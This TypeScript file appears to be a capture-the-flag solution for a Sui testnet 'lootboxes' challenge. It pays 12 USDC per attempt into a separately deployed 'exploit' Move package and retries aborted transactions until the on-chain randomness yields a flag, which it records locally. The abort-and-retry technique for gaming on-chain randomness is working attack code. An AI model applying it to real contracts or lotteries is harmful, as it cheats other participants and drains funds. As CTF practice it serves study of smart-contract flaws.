import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from "../keypair.json" with { type: "json" };
import { recordFlag, getFlagObjectIdFromResult } from "./record-flag.ts";

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiGrpcClient({
	network: 'testnet',
	baseUrl: 'https://fullnode.testnet.sui.io:443',
});

const REQUIRED_PAYMENT = 12_000_000n; // 12 USDC (6 decimals)
const USDC_COIN_TYPE = '0xa1ec7fc00a6f40db9693ad1415d0c193ad3906494428cf252621037bd7117e29::usdc::USDC';
const RANDOM_OBJECT_ID = '0x8';

// Set this after deploying the exploit package: cd exploit && sui client publish --gas-budget 100000000
const EXPLOIT_PACKAGE_ID = process.env.EXPLOIT_PACKAGE_ID ?? '';

(async () => {
	if (!EXPLOIT_PACKAGE_ID) {
		console.log('Deploy the exploit first: cd exploit && sui client publish --gas-budget 100000000');
		console.log('Then set EXPLOIT_PACKAGE_ID in this script or env.');
		return;
	}

	const sender = keypair.getPublicKey().toSuiAddress();
	const { objects: coins } = await suiClient.listCoins({ owner: sender, coinType: USDC_COIN_TYPE });
	const total = coins?.reduce((sum, c) => sum + BigInt(c.balance), 0n) ?? 0n;
	if (total < REQUIRED_PAYMENT) {
		console.log(`Need at least ${REQUIRED_PAYMENT} USDC. You have ${total}.`);
		return;
	}

	// Try until we get a flag (contract aborts on no flag, so we retry)
	for (let attempt = 1; ; attempt++) {
		const { objects: list } = await suiClient.listCoins({ owner: sender, coinType: USDC_COIN_TYPE });
		const coin = list?.find((c) => BigInt(c.balance) >= REQUIRED_PAYMENT);
		if (!coin) {
			console.log('Out of USDC.');
			break;
		}

		const tx = new Transaction();
		const payment =
			BigInt(coin.balance) === REQUIRED_PAYMENT
				? tx.object(coin.objectId)
				: tx.splitCoins(tx.object(coin.objectId), [REQUIRED_PAYMENT])[0];

		tx.moveCall({
			target: `${EXPLOIT_PACKAGE_ID}::exploit::try_open`,
			arguments: [payment, tx.object(RANDOM_OBJECT_ID)],
		});

		try {
			const result = await suiClient.signAndExecuteTransaction({
				signer: keypair,
				transaction: tx,
				include: { effects: true, objectTypes: true },
			});
			if (result.$kind === "Transaction") {
				const digest = result.Transaction.digest;
				console.log(`Flag captured after ${attempt} attempt(s). Digest:`, digest);
				const flagId = getFlagObjectIdFromResult(result);
				if (digest && flagId) {
					recordFlag("lootboxes", digest, flagId);
					console.log("Flag ID saved to FLAGS/:", flagId);
				}
				return;
			}
		} catch (e) {
			// ENoFlag or other abort - retry
		}
		console.log(`Attempt ${attempt} - no flag, retrying...`);
	}
})();
